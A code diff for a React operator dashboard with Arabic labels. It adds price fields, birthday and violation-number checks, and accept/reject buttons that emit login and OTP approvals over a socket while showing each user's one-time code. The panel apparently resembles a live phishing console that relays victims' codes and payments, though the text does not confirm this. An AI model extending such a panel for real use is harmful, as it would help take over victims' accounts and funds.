@@ -11,7 +11,7 @@ const Main = () => {
   const [Users, setUsers] = useState([]);
   const [user, setUser] = useState({ data: {}, active: false });
 
-  const [price, setPrice] = useState("");
+  const [price, setPrice] = useState(null);
 
   const uniqueNum = () =>
     Math.floor(Math.random() * (10000000 - 999999 + 1)) + 999999;
@@ -40,7 +40,7 @@ const Main = () => {
   };
 
   const handleAcceptLogin = async (id) => {
-    if (!price) return window.alert("املاء حفل السعر");
+    if (!price && user.data.vioNumber) return window.alert("املاء حفل السعر");
     else {
       socket.emit("acceptLogin", { id, price });
       setUser({
@@ -64,7 +64,11 @@ const Main = () => {
   };
 
   const handleAcceptLoginOtp = async (id) => {
-    socket.emit("acceptOTPLogin", id);
+    if (new Date(user.data?.birthday) != "Invalid Date") {
+      if (!price) return window.alert("املاء حفل السعر");
+    }
+    socket.emit("acceptOTPLogin", { id, price });
+
     setUser({
       data: { ...user.data, loginOTPAccept: true, price },
       active: true,
@@ -374,9 +378,15 @@ const Main = () => {
                 ) : (
                   ""
                 )}
-                {user.data.loginAccept ? (
-                  ""
+                {user.data.price ? (
+                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
+                    <span> السعر </span>
+                    <span>{user.data?.price}</span>
+                  </div>
                 ) : (
+                  ""
+                )}
+                {!user.data.loginAccept && user.data.vioNumber ? (
                   <>
                     <input
                       className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
@@ -399,6 +409,29 @@ const Main = () => {
                       </button>
                     </div>
                   </>
+                ) : (
+                  ""
+                )}
+                {!user.data.loginAccept &&
+                new Date(user.data?.birthday) != "Invalid Date" ? (
+                  <>
+                    <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
+                      <button
+                        className="bg-green-500 w-1/2 p-2 rounded-lg"
+                        onClick={() => handleAcceptLogin(user.data._id)}
+                      >
+                        قبول
+                      </button>
+                      <button
+                        className="bg-red-500 w-1/2 p-2 rounded-lg"
+                        onClick={() => handleDeclineLogin(user.data._id)}
+                      >
+                        رفض
+                      </button>
+                    </div>
+                  </>
+                ) : (
+                  ""
                 )}
                 {user.data.loginOtp ? (
                   <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
@@ -413,6 +446,16 @@ const Main = () => {
                     ""
                   ) : (
                     <>
+                      {new Date(user.data?.birthday) != "Invalid Date" ? (
+                        <input
+                          className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
+                          value={price}
+                          onChange={(e) => setPrice(e.target.value)}
+                          placeholder="السعر"
+                        />
+                      ) : (
+                        ""
+                      )}
                       <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                         <button
                           className="bg-green-500 w-1/2 p-2 rounded-lg"
